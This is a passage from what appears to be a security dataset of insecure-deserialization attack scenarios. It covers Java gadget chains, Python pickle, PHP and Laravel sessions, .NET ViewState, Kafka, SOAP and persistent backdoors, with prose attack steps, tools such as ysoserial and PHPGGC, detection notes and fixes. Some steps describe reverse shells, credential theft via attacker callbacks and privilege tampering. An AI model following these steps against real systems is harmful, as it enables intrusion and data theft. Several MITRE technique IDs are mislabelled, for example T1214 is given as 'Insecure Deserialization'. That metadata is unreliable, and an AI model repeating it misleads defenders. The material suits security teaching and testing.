- **Scenario**: Attackers use insecure deserialization in cloud services to move from one compromised service to others by crafting serialized payloads exploiting trust in cloud communication.
- **Attack Steps**: Step 1: Identify multiple cloud services communicating via serialized data (e.g., microservices, functions). Step 2: Gain initial access to one cloud service with deserialization vulnerability. Step 3: Craft malicious serialized payloads that exploit deserialization bugs to escalate privileges or execute code. Step 4: Use these payloads to compromise adjacent services or cloud resources trusting the first compromised service. Step 5: Repeat this chain of deserialization attacks to move laterally across cloud services, escalating access and extracting data. Step 6: Verify success by accessing data or systems not originally compromised. Step 7: Monitor cloud logs and alerts for unusual inter-service deserialization errors or accesses. Step 8: Recommend strict inter-service authentication, input validation, and secure deserialization practices.
- **Detection**: Monitor cloud logs and deserialization errors
- **Solution**: Enforce least privilege, validate inputs, secure serialization across services
- **Tags**: Cloud, Lateral Movement, Microservices

## Java Deserialization Exploits Using JBoss or Weblogic Gadgets

- **Attack Type**: Java Gadget Chain Deserialization
- **Target**: Java Apps (JBoss/Weblogic)
- **Vulnerability**: Insecure Java Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, server compromise
- **Tools**: ysoserial, Burp Suite, JDK
- **Scenario**: Vulnerable Java apps (JBoss, Weblogic) deserialize untrusted input; attackers exploit gadget chains to run arbitrary code.
- **Attack Steps**: Step 1: Identify Java-based apps using JBoss, Weblogic, or similar frameworks that accept serialized Java objects from users or services. Step 2: Intercept or capture serialized Java objects sent to the application (e.g., via HTTP requests). Step 3: Use a gadget chain tool like ysoserial to generate a malicious serialized payload that chains vulnerable classes inside JBoss/Weblogic to achieve remote code execution. Step 4: Send this crafted payload to the vulnerable endpoint via HTTP or API call. Step 5: The vulnerable application deserializes the malicious object, triggering the gadget chain to execute system commands or deploy backdoors. Step 6: Confirm execution by checking server behavior or response changes. Step 7: Repeat with different gadget chains or payloads to explore attack surface. Step 8: Recommend patching libraries, disabling unsafe deserialization, and filtering input strictly.
- **Detection**: Monitor JVM logs, unexpected processes; IDS for malicious serialized data
- **Solution**: Patch vulnerable libraries; use allowlist deserialization; disable unsafe object types
- **Tags**: Java, Gadget Chains, ysoserial

## Deserialization of Signed but Unverified Objects

- **Attack Type**: Signature Verification Bypass
- **Target**: Web Applications
- **Vulnerability**: Unsigned or Unverified Serialized Objects
- **MITRE**: T1550 – Use of Valid Accounts
- **Impact**: Authentication bypass, privilege escalation
- **Tools**: Burp Suite, Custom scripts
- **Scenario**: Applications accept signed serialized objects but fail to verify signatures, allowing attackers to modify payloads freely.
- **Attack Steps**: Step 1: Identify applications using signed serialized objects (e.g., JWT, serialized tokens) for authentication or configuration. Step 2: Intercept a signed serialized object (e.g., token or session data). Step 3: Attempt to modify or tamper with fields inside the serialized object (e.g., changing roles or IDs). Step 4: Check if the application verifies the signature of the serialized object after modification. Step 5: If verification is missing or improperly implemented, send the tampered object back to the server. Step 6: The server accepts the tampered object as valid, granting unauthorized access or escalating privileges. Step 7: Verify the success by accessing protected resources or elevated roles. Step 8: Suggest enforcing strict cryptographic signature verification and rejecting unsigned or tampered objects.
- **Detection**: Detect signature verification failures; audit auth token usage
- **Solution**: Enforce cryptographic signature checks; reject unsigned data
- **Tags**: Signed Objects, Token Security

## Abuse of Serialization Filtering Bypass Techniques

- **Attack Type**: Serialization Filter Bypass
- **Target**: Java Apps
- **Vulnerability**: Serialization Filter Bypass
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, data tampering
- **Tools**: Burp Suite, ysoserial, fuzzers
- **Scenario**: Applications use serialization filters to block dangerous classes but attackers find ways to bypass these filters and exploit deserialization.
- **Attack Steps**: Step 1: Identify applications implementing Java serialization filters (e.g., allowlists) to prevent dangerous deserialization. Step 2: Research and find known bypass techniques or gadgets that evade these filters (e.g., chaining allowed classes in unexpected ways). Step 3: Use tools like ysoserial or custom scripts to craft payloads that bypass filters by exploiting filter weaknesses. Step 4: Send the bypass payload to the vulnerable deserialization endpoint. Step 5: The server accepts and deserializes the payload despite filtering, allowing attacker-controlled code execution or data manipulation. Step 6: Verify the attack by observing unauthorized actions or errors. Step 7: Iterate with variations to discover all bypass possibilities. Step 8: Recommend patching filters, restricting deserialization, and combining multiple security controls.
- **Detection**: Monitor deserialization failures and unusual input; test filter effectiveness
- **Solution**: Update filters regularly; combine allowlist with input validation; avoid native deserialization
- **Tags**: Serialization Filtering, Bypass

## Deserialization in GraphQL APIs with Unsafe Types

- **Attack Type**: GraphQL Deserialization Exploit
- **Target**: GraphQL APIs
- **Vulnerability**: Unsafe Input Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Code execution, data leakage
- **Tools**: GraphiQL, Burp Suite, Postman
- **Scenario**: GraphQL APIs accept complex object input; unsafe deserialization of these inputs leads to remote code execution or data access.
- **Attack Steps**: Step 1: Identify GraphQL APIs that accept input objects with custom types and deserialization. Step 2: Explore the GraphQL schema to find object input types that may trigger unsafe deserialization. Step 3: Craft malicious input objects designed to exploit unsafe deserialization logic (e.g., injecting special payloads inside nested input fields). Step 4: Use tools like GraphiQL or Postman to send crafted queries/mutations with malicious inputs to the GraphQL endpoint. Step 5: If the backend deserializes these inputs without proper validation or filtering, the payload triggers code execution or privilege escalation. Step 6: Check API responses or system logs for signs of successful exploitation. Step 7: Test different inputs to cover all unsafe deserialization paths. Step 8: Recommend strict input validation, disable unsafe types, and use secure deserialization methods.
- **Detection**: Audit GraphQL input handling; monitor API errors and unusual responses
- **Solution**: Validate inputs strictly; restrict input types; sanitize deserialization
- **Tags**: GraphQL, API Security

## Exploiting Deserialization in IoT Devices

- **Attack Type**: Insecure Deserialization in IoT
- **Target**: IoT Devices
- **Vulnerability**: Insecure Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Device takeover, data theft, network pivoting
- **Tools**: IoT toolkits, Burp Suite
- **Scenario**: IoT devices often deserialize firmware updates or messages. If unchecked, attackers send malicious serialized payloads to gain control.
- **Attack Steps**: Step 1: Identify IoT devices that accept serialized data over network (e.g., firmware update files, configuration messages). Step 2: Capture communication or update payloads between device and management system. Step 3: Reverse-engineer serialization format used by the device (binary, JSON, protobuf). Step 4: Craft malicious serialized payloads embedding commands or malware designed to exploit deserialization vulnerabilities. Step 5: Send malicious payloads to the device via network or update channel. Step 6: Device deserializes payload and executes unintended commands, leading to full device compromise or data leakage. Step 7: Verify device behavior changes or abnormal network activity. Step 8: Recommend securing device update mechanisms, encrypting payloads, and validating deserialization safely.
- **Detection**: Monitor device logs; detect abnormal commands or firmware changes
- **Solution**: Encrypt updates; validate inputs; implement secure deserialization
- **Tags**: IoT, Firmware Security

## Serialization Bombs Causing Denial of Service (DoS)

- **Attack Type**: Denial of Service via Malicious Payloads
- **Target**: Web apps, APIs
- **Vulnerability**: Resource Exhaustion via Deserialization
- **MITRE**: T1499 – Endpoint Denial of Service
- **Impact**: Service outage, downtime
- **Tools**: Burp Suite, ysoserial, custom scripts
- **Scenario**: Attackers craft huge or recursive serialized objects that exhaust server resources when deserialized, causing crashes or slowdowns.
- **Attack Steps**: Step 1: Identify endpoints that accept serialized objects for processing (e.g., session data, API inputs). Step 2: Understand the serialization format (Java serialization, Python pickle, etc.). Step 3: Use or create “serialization bombs” — specially crafted objects with deeply nested or repetitive references, such as “billion laughs” or exponential graphs. Step 4: Send these payloads to the server’s deserialization endpoints via HTTP requests or API calls. Step 5: The server attempts to deserialize the payload, consuming excessive CPU, memory, or disk I/O. Step 6: Server becomes unresponsive or crashes, causing denial of service. Step 7: Confirm DoS by observing slow responses or service downtime. Step 8: Mitigate by limiting object size, setting resource/time limits on deserialization, and validating inputs strictly.
- **Detection**: Monitor server CPU/memory spikes; log deserialization errors
- **Solution**: Enforce size limits; sandbox deserialization; implement quotas
- **Tags**: DoS, Serialization Bombs

## Deserialization of Pickled Objects via Insecure APIs

- **Attack Type**: Unsafe Python Pickle Deserialization
- **Target**: Python Web Apps
- **Vulnerability**: Unsafe Pickle Deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, server takeover
- **Tools**: Burp Suite, Python pickle, custom scripts
- **Scenario**: Python web apps accept pickle data from untrusted sources, allowing attackers to execute arbitrary Python code.
- **Attack Steps**: Step 1: Identify APIs or endpoints that accept Python pickle-serialized data from users or clients. Step 2: Intercept or capture pickle payloads sent to these APIs. Step 3: Create a malicious pickle payload embedding Python code execution (e.g., os.system calls). Tools like ‘pickletools’ or custom Python scripts help craft these payloads. Step 4: Send the malicious pickle payload to the vulnerable API endpoint. Step 5: Server deserializes the pickle data unsafely, executing embedded commands, leading to remote code execution or data compromise. Step 6: Validate successful exploitation by monitoring server responses or behavior changes. Step 7: Repeat with different payloads to fully assess impact. Step 8: Fix by never unpickling untrusted data; use safer formats like JSON; apply strict input validation.
- **Detection**: Monitor API calls with pickle data; detect suspicious system calls
- **Solution**: Avoid pickle for untrusted input; switch to safe serialization methods
- **Tags**: Python, Pickle, RCE

## Deserialization of Untrusted Data in Kafka Consumers

- **Attack Type**: Unsafe Deserialization in Message Brokers
- **Target**: Kafka-based Apps
- **Vulnerability**: Unsafe Deserialization in Message Queue
- **MITRE**: T1588 – Abuse of Cloud Services
- **Impact**: Code execution, data tampering
- **Tools**: Kafka clients, Burp Suite, custom tools
- **Scenario**: Kafka consumers deserialize messages from topics without validation; attackers inject malicious payloads causing RCE or logic abuse.
- **Attack Steps**: Step 1: Identify Kafka consumers in the application that deserialize objects from Kafka message topics. Step 2: Observe or intercept messages sent to Kafka topics (may require access to Kafka producer or broker). Step 3: Craft malicious serialized messages (Java serialized objects, JSON, or protobuf) containing exploit payloads. Step 4: Publish these malicious messages to the Kafka topic the consumer reads from. Step 5: Kafka consumer receives and deserializes malicious payload without validation, triggering unintended code execution or state manipulation. Step 6: Verify consumer misbehavior via logs, errors, or abnormal app behavior. Step 7: Repeat with different payloads or topics to test breadth. Step 8: Remediate by validating and sanitizing Kafka messages; use safe deserialization libraries; restrict producer access.
- **Detection**: Monitor Kafka topic inputs; detect deserialization exceptions
- **Solution**: Validate Kafka messages; restrict producer privileges; implement deserialization filters
- **Tags**: Kafka, Message Queue, RCE

## Cross-Protocol Deserialization Attacks (e.g., RMI and HTTP)

- **Attack Type**: Cross-Protocol Attack via Deserialization
- **Target**: Multi-protocol systems
- **Vulnerability**: Cross-protocol deserialization vulnerability
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, escalation
- **Tools**: Burp Suite, ysoserial, JDK tools
- **Scenario**: Attackers exploit multiple protocols that deserialize the same objects differently, sending payloads crafted for one protocol to another.
- **Attack Steps**: Step 1: Identify targets using multiple protocols sharing serialized object formats (e.g., Java RMI and HTTP). Step 2: Research protocol-specific deserialization logic and how they interpret payloads differently. Step 3: Craft serialized payloads that behave differently depending on the protocol parsing them, exploiting logic or execution flaws. Step 4: Send these payloads through one protocol’s endpoint (e.g., HTTP) that forwards or triggers deserialization in another protocol (e.g., RMI). Step 5: The target interprets malicious payload causing code execution or privilege escalation. Step 6: Confirm attack success by checking responses or server effects. Step 7: Experiment with variations for different protocol combinations. Step 8: Mitigate by segregating protocol handlers, validating inputs per protocol, and disabling unsafe deserialization.
- **Detection**: Monitor cross-protocol traffic; validate incoming objects per protocol
- **Solution**: Isolate protocols; strict input validation per protocol; patch libraries
- **Tags**: Cross-Protocol, RMI, HTTP

## Exploiting Deserialization via Unsafe Event Handling

- **Attack Type**: Deserialization Exploit via Event Processing
- **Target**: Event-Driven Apps
- **Vulnerability**: Unsafe Deserialization in Event Handlers
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, data corruption
- **Tools**: Burp Suite, Event listeners, custom scripts
- **Scenario**: Applications that deserialize serialized events (e.g., webhooks, message bus) insecurely allow attacker-supplied data to trigger harmful code.
- **Attack Steps**: Step 1: Identify systems that receive serialized events (e.g., webhook handlers, event bus consumers). Step 2: Intercept or observe events sent to these systems. Step 3: Craft malicious serialized events containing exploit payloads (e.g., arbitrary code execution or data manipulation). Step 4: Send crafted malicious events to the event handling system through allowed channels (API, message bus). Step 5: Event handler deserializes the malicious event unsafely, triggering execution of attacker payload or unauthorized changes. Step 6: Confirm successful exploit by checking event handler logs or server responses. Step 7: Test with variations for multiple event types. Step 8: Fix by validating event payloads, disabling deserialization of untrusted events, or using safer serialization formats.
- **Detection**: Monitor event queues and logs; detect suspicious event data
- **Solution**: Validate events; use safe serialization formats; isolate event processing
- **Tags**: Events, Webhooks, Message Bus

## Deserialization in PHP Sessions Leading to Code Execution

- **Attack Type**: Unsafe Deserialization in Session Handling
- **Target**: PHP Web Apps
- **Vulnerability**: Unsafe PHP unserialize() on session data
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, privilege escalation
- **Tools**: Burp Suite, PHP session tools
- **Scenario**: PHP apps store user session data serialized; if attacker can modify session data, they can execute arbitrary code.
- **Attack Steps**: Step 1: Identify web apps using PHP session serialization (usually serialize() and unserialize() functions). Step 2: Intercept the PHP session cookie or session storage file. Step 3: Decode the serialized session data, understanding PHP object formats. Step 4: Craft malicious serialized objects that exploit vulnerable PHP classes with magic methods (__wakeup, __destruct) to execute code on unserialization. Tools like PHPGGC can help generate payloads. Step 5: Replace the original session data with the malicious serialized payload and send it back to the server via the session cookie or storage. Step 6: When the server unserializes the session, the payload executes arbitrary PHP code, allowing command execution or privilege escalation. Step 7: Verify code execution by triggering commands via web requests. Step 8: Mitigate by avoiding unserialize() on untrusted data, use safer session handlers, and keep PHP frameworks updated.
- **Detection**: Monitor session data for unexpected serialized payloads; log deserialization errors
- **Solution**: Use JSON for session storage; disable unserialize() on untrusted input; patch vulnerable classes
- **Tags**: PHP, Sessions, RCE

## Unsafe Deserialization in Laravel Framework Applications

- **Attack Type**: Deserialization Vulnerabilities in Laravel
- **Target**: Laravel PHP Apps
- **Vulnerability**: Unsafe unserialize in encrypted cookies
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, server compromise
- **Tools**: Burp Suite, Laravel Debug Tools
- **Scenario**: Laravel apps using unsafe unserialization of data (e.g., in cookies or cached data) can be exploited for RCE.
- **Attack Steps**: Step 1: Identify Laravel apps accepting serialized or encrypted data (such as encrypted cookies or cache entries). Step 2: Intercept encrypted cookies or cached data transmitted or stored. Step 3: Decrypt or decode the data if possible (Laravel uses AES encryption with app keys). Step 4: Craft malicious serialized payloads targeting Laravel’s vulnerable classes with magic methods that execute code on deserialization. Tools like PHPGGC have Laravel-specific gadget chains. Step 5: Encrypt and encode the malicious payload to replicate Laravel’s format and send it as a cookie or cached value to the server. Step 6: When the Laravel app decrypts and unserializes the payload, it executes attacker code (e.g., system commands). Step 7: Confirm by checking web app responses or effects of command execution. Step 8: Fix by applying Laravel security patches, avoiding unsafe unserialize calls, and validating data integrity via signatures.
- **Detection**: Monitor cookie integrity; log deserialization failures
- **Solution**: Update Laravel; disable unsafe unserialize; use signed/encrypted cookies properly
- **Tags**: Laravel, PHP, RCE

## Deserialization Payloads Exploiting Unsafe Reflection

- **Attack Type**: Code Execution via Reflection Abuse in Deserialization
- **Target**: PHP/Java Apps
- **Vulnerability**: Unsafe reflection usage during deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, privilege escalation
- **Tools**: Burp Suite, PHPGGC, ysoserial
- **Scenario**: Attackers craft serialized objects that abuse reflection APIs (like PHP or Java reflection) during deserialization to execute code.
- **Attack Steps**: Step 1: Identify apps that use reflection (PHP ReflectionClass, Java Reflection API) combined with deserialization of user input. Step 2: Analyze vulnerable classes or libraries that call reflection functions during object construction or deserialization. Step 3: Craft serialized payloads that instantiate or manipulate reflection objects or invoke unsafe methods during deserialization. Tools like PHPGGC or ysoserial help generate such payloads. Step 4: Deliver the payload through HTTP requests or cookies to the vulnerable endpoint. Step 5: Upon deserialization, the reflection API misuse executes arbitrary code or system commands. Step 6: Confirm by observing execution effects or server logs. Step 7: Iterate with different payloads to maximize access. Step 8: Prevent by patching vulnerable libraries, restricting reflection usage, and validating inputs before deserialization.
- **Detection**: Monitor deserialization logs; detect reflection misuse
- **Solution**: Patch libraries; restrict reflection calls; validate/escape inputs
- **Tags**: Reflection, Deserialization, RCE

## Remote Code Execution via Unsafe Deserialization in Python Flask

- **Attack Type**: Python Flask Deserialization RCE
- **Target**: Python Flask Apps
- **Vulnerability**: Unsafe pickle/YAML deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, server compromise
- **Tools**: Burp Suite, Python Pickle tools
- **Scenario**: Flask apps accepting unsafe pickle or YAML serialized data allow attackers to execute arbitrary code remotely.
- **Attack Steps**: Step 1: Locate Flask app endpoints accepting serialized data formats such as pickle, YAML, or unsafe JSON. Step 2: Intercept the payloads sent to these endpoints. Step 3: Craft malicious serialized objects embedding code execution instructions (e.g., Python os.system commands) using pickle or unsafe YAML features. Step 4: Send the crafted payload to the Flask endpoint. Step 5: The Flask app deserializes the payload unsafely, running embedded Python commands leading to RCE. Step 6: Verify code execution by triggering commands that affect server response or behavior. Step 7: Repeat with different payloads or endpoints to assess attack scope. Step 8: Mitigate by avoiding pickle/YAML deserialization of untrusted data, use safe serialization (e.g., JSON), and validate inputs.
- **Detection**: Monitor deserialization failures; track suspicious requests
- **Solution**: Use safe serialization formats; validate inputs; patch frameworks
- **Tags**: Python, Flask, RCE

## Deserialization Attacks Using Untrusted XML-RPC Payloads

- **Attack Type**: XML-RPC Deserialization Vulnerabilities
- **Target**: APIs using XML-RPC
- **Vulnerability**: Unsafe deserialization of XML payloads
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, data breach
- **Tools**: Burp Suite, XML tools
- **Scenario**: XML-RPC APIs that deserialize incoming XML payloads without validation can be exploited to execute code or abuse logic.
- **Attack Steps**: Step 1: Identify XML-RPC endpoints that accept serialized XML payloads (common in legacy or SOAP-like APIs). Step 2: Analyze the XML structure and understand how it maps to objects/functions on the server. Step 3: Craft malicious XML-RPC requests containing payloads that, when deserialized, trigger dangerous methods or code execution. Tools like Burp Suite’s XML editor help craft payloads. Step 4: Send malicious XML-RPC requests to the vulnerable endpoint. Step 5: The server deserializes and processes the XML, executing attacker commands or leaking data. Step 6: Confirm successful exploitation by checking for command output or unauthorized behavior. Step 7: Try different payloads to test full impact. Step 8: Fix by validating XML inputs strictly, applying XML parsers with secure settings, and disabling dangerous deserialization features.
- **Detection**: Monitor XML-RPC calls; detect unexpected commands or method calls
- **Solution**: Use secure XML parsers; validate payloads; patch libraries
- **Tags**: XML-RPC, Deserialization, RCE

## Deserialization-based Credential Theft via Malicious Objects

- **Attack Type**: Credential Theft through Deserialization
- **Target**: Web Apps, APIs
- **Vulnerability**: Insecure deserialization allowing code execution
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Credential theft, unauthorized access
- **Tools**: Burp Suite, PHPGGC, ysoserial
- **Scenario**: Attackers craft malicious serialized objects that steal credentials or sensitive info when deserialized by the server.
- **Attack Steps**: Step 1: Identify application features that deserialize user-controlled data (e.g., session, API, or cache). Step 2: Intercept the serialized object sent to the server using proxy tools like Burp Suite. Step 3: Analyze the serialized format (PHP, Java, Python) and understand how objects are structured. Step 4: Use payload generators like PHPGGC or ysoserial to craft malicious objects designed to capture credentials during deserialization (e.g., dump session tokens or environment variables). Step 5: Replace legitimate serialized data with malicious payload and resend it to the server. Step 6: When the server unserializes the object, it executes the malicious code extracting sensitive credentials or tokens. Step 7: Retrieve stolen credentials from attacker-controlled channels (e.g., HTTP callback, logs). Step 8: Repeat to steal additional secrets or escalate privileges. Step 9: Mitigate by avoiding unsafe deserialization and validating inputs strictly.
- **Detection**: Monitor logs for unusual deserialization activity
- **Solution**: Use safe serialization formats; sanitize/validate input; apply principle of least privilege
- **Tags**: Credential Theft, RCE

## Exploiting Deserialization to Bypass Authentication

- **Attack Type**: Auth Bypass via Malicious Object Deserialization
- **Target**: Web Apps, Auth Systems
- **Vulnerability**: Unsafe deserialization of auth/session objects
- **MITRE**: T1550 – Use of Valid Credentials
- **Impact**: Unauthorized access, privilege escalation
- **Tools**: Burp Suite, serialized data editors
- **Scenario**: Attackers exploit deserialization flaws to modify authentication objects, gaining unauthorized access.
- **Attack Steps**: Step 1: Locate parts of the app that deserialize authentication tokens, cookies, or session objects. Step 2: Capture the serialized auth object during normal login using a proxy. Step 3: Understand the object fields related to user roles or login status. Step 4: Modify the serialized data to escalate privileges, e.g., change is_admin=false to is_admin=true. Step 5: Re-serialize and send the manipulated object back to the server. Step 6: When deserialized, the app grants higher privileges or bypasses login checks. Step 7: Confirm by accessing admin-only pages or functionality. Step 8: Repeat to test various authentication bypass methods. Step 9: Defend by signing/encrypting serialized auth tokens and validating session integrity.
- **Detection**: Detect mismatched session and role data
- **Solution**: Sign and encrypt tokens; implement server-side validation
- **Tags**: Auth Bypass, Session Manipulation

## Object Injection Attacks via Unsafe Object Factories

- **Attack Type**: Object Injection Leading to Code Execution or Logic Flaws
- **Target**: Web Apps, APIs
- **Vulnerability**: Unsafe object factory deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Code execution, application logic bypass
- **Tools**: Burp Suite, code analyzers
- **Scenario**: Apps using unsafe “object factory” methods create objects from untrusted serialized input, enabling injection.
- **Attack Steps**: Step 1: Identify web applications using object factories or reflection to instantiate objects from serialized input. Step 2: Intercept serialized data sent to the server. Step 3: Analyze the factory’s logic to find if it blindly trusts the input class names or properties. Step 4: Craft malicious serialized objects specifying attacker-controlled classes or methods. Step 5: Send manipulated data to the server. Step 6: The factory creates attacker-controlled objects, triggering unintended behavior or code execution. Step 7: Verify exploitation by observing altered application behavior or executed commands. Step 8: Prevent by avoiding unsafe factories, using strict whitelists of allowed classes, and validating inputs.
- **Detection**: Monitor class instantiation logs; scan for injection patterns
- **Solution**: Use safe object creation patterns; whitelist classes; validate inputs
- **Tags**: Object Injection, RCE

## Deserialization Attack via Manipulated Cookies or Tokens

- **Attack Type**: Cookie/Token Manipulation to Trigger Deserialization Vulnerability
- **Target**: Web Apps, Browsers
- **Vulnerability**: Manipulated serialized cookies or tokens
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: RCE, session hijacking, privilege escalation
- **Tools**: Burp Suite, cookie editors
- **Scenario**: Attackers tamper with serialized cookies or tokens to inject malicious objects causing code execution.
- **Attack Steps**: Step 1: Identify applications using serialized cookies or tokens for state or auth. Step 2: Capture and decode serialized cookie/token using proxy tools. Step 3: Modify the serialized data to inject malicious payloads or alter sensitive fields. Step 4: Re-encode and send the manipulated cookie/token back to the server. Step 5: When server deserializes the cookie/token, malicious payload executes or unauthorized access is granted. Step 6: Validate success by observing system behavior or access level. Step 7: Repeat attack with various payloads to maximize impact. Step 8: Mitigate by encrypting/signing cookies, using safe serialization, and validating integrity.
- **Detection**: Monitor cookie tampering; log failed signature validations
- **Solution**: Sign and encrypt cookies; avoid unserialize on untrusted data
- **Tags**: Cookie Tampering, RCE

## Unsafe Deserialization in JavaScript Object Notation (JSON) Parsing

- **Attack Type**: Exploiting Unsafe JSON Parsing to Trigger Object Injection
- **Target**: Web Apps, APIs
- **Vulnerability**: Unsafe JSON parsing and deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Code execution, privilege escalation, data corruption
- **Tools**: Burp Suite, JSON tools
- **Scenario**: Vulnerable apps parse JSON containing unsafe objects leading to code execution or logic bypass.
- **Attack Steps**: Step 1: Find endpoints accepting JSON input deserialized into objects without strict schema validation. Step 2: Intercept JSON requests and study the object structure expected by the app. Step 3: Craft malicious JSON payloads embedding unexpected or dangerous fields, such as prototype pollution keys (__proto__, constructor). Step 4: Send crafted JSON to the server. Step 5: The server’s unsafe parser uses the JSON to create objects leading to code execution, logic bypass, or prototype pollution attacks. Step 6: Confirm by triggering admin-only actions or abnormal app behavior. Step 7: Repeat payload crafting to expand attack scope. Step 8: Defend by strict JSON schema validation, sanitizing input, and updating parsers.
- **Detection**: Monitor JSON payloads for dangerous keys; validate input schema
- **Solution**: Use strict JSON schema validation; sanitize and escape input; patch libraries
- **Tags**: JSON Injection, Prototype Pollution

## Exploiting Deserialization in SOAP Web Services

- **Attack Type**: SOAP XML Deserialization Attack
- **Target**: SOAP Web Services
- **Vulnerability**: Unsafe XML deserialization in SOAP messages
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Remote code execution, data leakage
- **Tools**: Burp Suite, SOAP UI, SOAPSonar
- **Scenario**: SOAP services deserialize XML data without validation, allowing malicious payloads that execute commands.
- **Attack Steps**: Step 1: Identify SOAP web services endpoints that accept XML input. Step 2: Intercept a valid SOAP request using a proxy like Burp Suite. Step 3: Analyze the SOAP XML structure and locate serialized objects or XML elements that the server deserializes. Step 4: Craft a malicious SOAP XML payload embedding a malicious serialized object or XML tag designed to trigger deserialization vulnerabilities (e.g., XML external entities or gadget chain payloads). Step 5: Replace the original XML with the crafted payload and send the request to the server. Step 6: The SOAP service deserializes the malicious XML, triggering remote code execution or unauthorized behavior. Step 7: Verify attack success by checking server response or side effects (command execution, data access). Step 8: Repeat with varied payloads to expand control. Step 9: Defend by validating XML input, disabling unsafe deserialization, and using XML parsers resistant to XXE and gadget chains.
- **Detection**: Monitor XML payloads for anomalies; scan logs for suspicious XML parser errors
- **Solution**: Validate and sanitize XML input; disable external entities; update SOAP libraries
- **Tags**: SOAP, XML, Deserialization

## Using Deserialization for Persistent Backdoors

- **Attack Type**: Persistent Backdoor via Malicious Serialized Objects
- **Target**: Web Apps, Databases
- **Vulnerability**: Persistent unsafe deserialization
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Long-term remote access, privilege escalation
- **Tools**: Burp Suite, serialization tools
- **Scenario**: Attackers upload or inject serialized objects that execute code on every deserialization, creating backdoors.
- **Attack Steps**: Step 1: Find features accepting serialized input stored persistently (e.g., database, cache, files). Step 2: Craft malicious serialized payloads embedding backdoor code that triggers on deserialization (e.g., opening reverse shell or creating admin user). Step 3: Inject or upload the malicious object via the app’s input methods (forms, APIs). Step 4: The application stores this object persistently (e.g., in session storage, DB). Step 5: Whenever the app deserializes this stored object (e.g., during user requests), the backdoor code executes automatically, granting attacker long-term access. Step 6: Confirm persistence by accessing the backdoor repeatedly. Step 7: Use the backdoor to escalate privileges or move laterally. Step 8: Prevent by disallowing unsafe deserialization of untrusted stored objects, applying integrity checks, and monitoring unusual persistence behavior.
- **Detection**: Audit stored serialized data; monitor for unusual deserialization activity
- **Solution**: Avoid persistent unsafe deserialization; use signed/encrypted serialized objects
- **Tags**: Backdoor, Persistence, RCE

## Deserialization Attacks via Unsafe Event Sourcing

- **Attack Type**: Event Sourcing Deserialization Attack
- **Target**: Event Sourcing Systems
- **Vulnerability**: Unsafe deserialization of event data
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: Code execution, state manipulation
- **Tools**: Burp Suite, event replay tools
- **Scenario**: Event sourcing systems replay serialized events; unsafe deserialization can trigger malicious code execution.
- **Attack Steps**: Step 1: Identify event sourcing features replaying serialized events for state reconstruction. Step 2: Access or intercept events accepted by the system, usually serialized objects stored in event logs or queues. Step 3: Create malicious serialized event payloads designed to execute code or manipulate application state. Step 4: Inject the malicious events into the event log or replay queue. Step 5: When the event sourcing system replays these events, it deserializes the malicious payloads, causing code execution or logic tampering. Step 6: Verify impact by observing unauthorized state changes or system behavior. Step 7: Repeat injection with varied payloads for wider impact. Step 8: Mitigate by validating event payloads, using safe serialization methods, and restricting deserialization privileges.
- **Detection**: Monitor event logs for malformed or unexpected events
- **Solution**: Validate event data; sandbox deserialization; enforce strict input schemas
- **Tags**: Event Sourcing, RCE, State Tampering

## Exploiting Deserialization in .NET ViewState Parameters

- **Attack Type**: ViewState Deserialization Attack
- **Target**: ASP.NET Apps
- **Vulnerability**: Unsafe deserialization of ViewState parameters
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: RCE, privilege escalation
- **Tools**: Burp Suite, ViewState decoder
- **Scenario**: Attackers modify .NET ViewState data to inject malicious objects deserialized by the server.
- **Attack Steps**: Step 1: Identify ASP.NET web applications using ViewState parameters in POST requests or URLs. Step 2: Capture a legitimate ViewState parameter using a proxy tool. Step 3: Decode the ViewState to understand its serialized content using ViewState decoder tools. Step 4: Modify the decoded ViewState to inject malicious serialized objects or change sensitive data (e.g., user roles). Step 5: Re-encode the ViewState and send it back to the server. Step 6: The server deserializes the malicious ViewState, potentially triggering code execution or privilege escalation. Step 7: Confirm attack success by accessing unauthorized resources or observing unexpected behavior. Step 8: Repeat with different payloads to maximize impact. Step 9: Protect by enabling ViewState MAC (message authentication code), encrypting ViewState, and validating integrity.
- **Detection**: Monitor ViewState validation errors; detect abnormal ViewState payloads
- **Solution**: Enable ViewState MAC and encryption; validate on server side
- **Tags**: ViewState, ASP.NET, RCE

## Bypassing Deserialization Protection Mechanisms Using Gadget Chains

- **Attack Type**: Gadget Chain Exploitation to Bypass Defenses
- **Target**: Web Apps, APIs
- **Vulnerability**: Insecure deserialization with weak protections
- **MITRE**: T1214 – Insecure Deserialization
- **Impact**: RCE, bypass of security controls
- **Tools**: ysoserial, Burp Suite, payload generators
- **Scenario**: Attackers use known gadget chains to bypass deserialization filters and achieve code execution.
- **Attack Steps**: Step 1: Identify deserialization protection in place (e.g., input filtering, whitelisting). Step 2: Research known gadget chains compatible with the target language/framework (e.g., Java Commons Collections). Step 3: Use tools like ysoserial to generate serialized payloads chaining multiple classes/methods (“gadgets”) to bypass protections. Step 4: Send the crafted payload to the vulnerable deserialization endpoint, bypassing filtering or input validation. Step 5: When deserialized, the gadget chain triggers arbitrary code execution or other malicious effects. Step 6: Validate attack success by observing executed commands or altered behavior. Step 7: Repeat with different gadget chains to improve bypass success. Step 8: Defend by patching vulnerable libraries, enforcing strict allowlists, and using deserialization libraries with strong validation.
